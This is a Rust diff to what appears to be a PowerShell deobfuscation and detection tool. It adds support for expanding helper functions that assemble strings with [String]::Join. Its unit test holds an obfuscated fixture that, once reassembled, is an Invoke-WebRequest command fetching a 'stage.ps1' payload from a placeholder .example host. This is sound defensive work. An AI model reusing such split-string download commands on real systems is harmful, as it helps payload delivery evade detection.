@@ -1091,6 +1091,14 @@ static PS_LITERAL_STRING_CONCAT_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
 });
 
 #[allow(clippy::expect_used)]
+static PS_LITERAL_STRING_JOIN_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(
+        r#"(?is)(?:\breturn\s+)?\[(?:System\.)?String\]::Join\s*\(\s*((?:'(?:(?:'')|[^'])*')|(?:"(?:`.|[^"`$])*"))\s*,\s*@?\(\s*((?:\$[A-Za-z_][A-Za-z0-9_]*\s*,\s*){1,7}\$[A-Za-z_][A-Za-z0-9_]*)\s*\)\s*\)"#,
+    )
+    .expect("ps literal string join extractor body regex")
+});
+
+#[allow(clippy::expect_used)]
 static PS_LITERAL_INDEX_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
         r#"(?is)(?:\breturn\s+)?(?:\(\s*)?\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\)\s*)?\[\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\]"#,
@@ -3854,7 +3862,9 @@ fn expand_literal_string_case_extractor_calls(text: &str) -> String {
 fn expand_literal_concat_extractor_calls(text: &str) -> String {
     let lower = text.to_ascii_lowercase();
     if !has_literal_extractor_def_signal(&lower)
-        || !(text.contains('+') || lower.contains("string]::concat"))
+        || !(text.contains('+')
+            || lower.contains("string]::concat")
+            || lower.contains("string]::join"))
         || !text.contains('\'')
     {
         return text.to_string();
@@ -3863,20 +3873,28 @@ fn expand_literal_concat_extractor_calls(text: &str) -> String {
     let mut out = text.to_string();
     for (name, params, body) in literal_substring_extractor_defs(text).into_iter().take(32) {
         let param_index = parse_ps_function_param_indices(&params);
-        let expr = if let Some(caps) = PS_LITERAL_CONCAT_EXTRACTOR_BODY_RE.captures(&body) {
-            let Some(expr) = caps.get(1) else {
-                continue;
-            };
+        let (expr, sep) = if let Some(caps) = PS_LITERAL_CONCAT_EXTRACTOR_BODY_RE.captures(&body) {
+            let Some(expr) = caps.get(1) else { continue };
             let after_expr = skip_ascii_ws(body.as_bytes(), expr.end());
             if body.as_bytes().get(after_expr) == Some(&b'+') {
                 continue;
             }
-            expr
+            (expr, String::new())
         } else if let Some(caps) = PS_LITERAL_STRING_CONCAT_EXTRACTOR_BODY_RE.captures(&body) {
-            let Some(expr) = caps.get(1) else {
+            let Some(expr) = caps.get(1) else { continue };
+            (expr, String::new())
+        } else if let Some(caps) = PS_LITERAL_STRING_JOIN_EXTRACTOR_BODY_RE.captures(&body) {
+            let Some(sep) = caps
+                .get(1)
+                .and_then(|m| parse_complete_ps_static_quoted_literal(m.as_str()))
+            else {
                 continue;
             };
-            expr
+            if sep.len() > 512 {
+                continue;
+            }
+            let Some(expr) = caps.get(2) else { continue };
+            (expr, sep)
         } else {
             continue;
         };
@@ -3886,6 +3904,7 @@ fn expand_literal_concat_extractor_calls(text: &str) -> String {
         let binding = PsConcatExtractorParamBinding {
             parts,
             arg_count: param_index.len(),
+            sep,
         };
         out = inline_ps_literal_concat_calls(&out, &name, binding);
     }
@@ -6751,6 +6770,7 @@ struct PsConcatExtractorPart<'a> {
 struct PsConcatExtractorParamBinding<'a> {
     parts: Vec<PsConcatExtractorPart<'a>>,
     arg_count: usize,
+    sep: String,
 }
 
 fn inline_ps_literal_concat_calls(
@@ -6783,7 +6803,13 @@ fn inline_ps_literal_concat_calls(
                 pos = skip_ascii_ws(bytes, pos + 1);
             }
             let parsed = if bytes.get(pos) == Some(&b'-') {
-                inline_ps_named_literal_concat_call(text, pos, parenthesized, &binding.parts)
+                inline_ps_named_literal_concat_call(
+                    text,
+                    pos,
+                    parenthesized,
+                    &binding.parts,
+                    &binding.sep,
+                )
             } else {
                 parse_ps_positional_literal_concat_args(text, pos, parenthesized, &binding)
                     .map(|(call_end, value)| (call_end, format!("'{}'", value.replace('\'', "''"))))
@@ -6847,7 +6873,10 @@ fn parse_ps_positional_literal_concat_args(
     }
 
     let mut value = String::new();
-    for part in values {
+    for (idx, part) in values.into_iter().enumerate() {
+        if idx > 0 {
+            value.push_str(&binding.sep);
+        }
         value.push_str(&part?);
     }
     (value.len() <= 8192).then_some((arg_end, value))
@@ -6858,16 +6887,20 @@ fn inline_ps_named_literal_concat_call(
     pos: usize,
     parenthesized: bool,
     parts: &[PsConcatExtractorPart<'_>],
+    sep: &str,
 ) -> Option<(usize, String)> {
     let (call_end, args) =
         parse_ps_named_static_literal_or_usize_args(text, pos, parenthesized, 8)?;
     let mut value = String::new();
-    for part in parts {
+    for (idx, part) in parts.iter().enumerate() {
         let chunk = args
             .iter()
             .find(|(name, _)| name.eq_ignore_ascii_case(part.name))?
             .1
             .as_literal()?;
+        if idx > 0 {
+            value.push_str(sep);
+        }
         value.push_str(chunk);
     }
     if value.len() > 8192 {
@@ -7774,7 +7807,9 @@ impl PsObfuscationSignals {
         let string_case_extractor =
             has_function_def && (lower.contains(".tolower") || lower.contains(".toupper"));
         let literal_concat_extractor = has_function_def
-            && (text.contains('+') || lower.contains("string]::concat"))
+            && (text.contains('+')
+                || lower.contains("string]::concat")
+                || lower.contains("string]::join"))
             && text.contains('\'');
         let literal_index_extractor = has_function_def
             && (lower.contains('[')
@@ -10206,6 +10241,23 @@ Join-Text -right '.example/stage.ps1' -left 'Invoke-WebRequest -Uri https://ps-s
                 "'Invoke-WebRequest -Uri https://ps-string-concat-named-extractor.example/stage.ps1'"
             ),
             "named-argument [string]::Concat extractor call was not rewritten:\n{out}"
+        );
+    }
+
+    #[test]
+    fn literal_string_join_extractor_named_args_call_is_rewritten() {
+        let text = r#"function Join-Text($left,$middle,$right) {
+  return [System.String]::Join('', @($left,$middle,$right))
+}
+Join-Text -right '.example/stage.ps1' -left 'Invoke-WebRequest -Uri https://ps-string-join-named' -middle '-extractor'"#;
+
+        let out = expand_literal_concat_extractor_calls(text);
+
+        assert!(
+            out.contains(
+                "'Invoke-WebRequest -Uri https://ps-string-join-named-extractor.example/stage.ps1'"
+            ),
+            "named-argument [string]::Join extractor call was not rewritten:\n{out}"
         );
     }
 
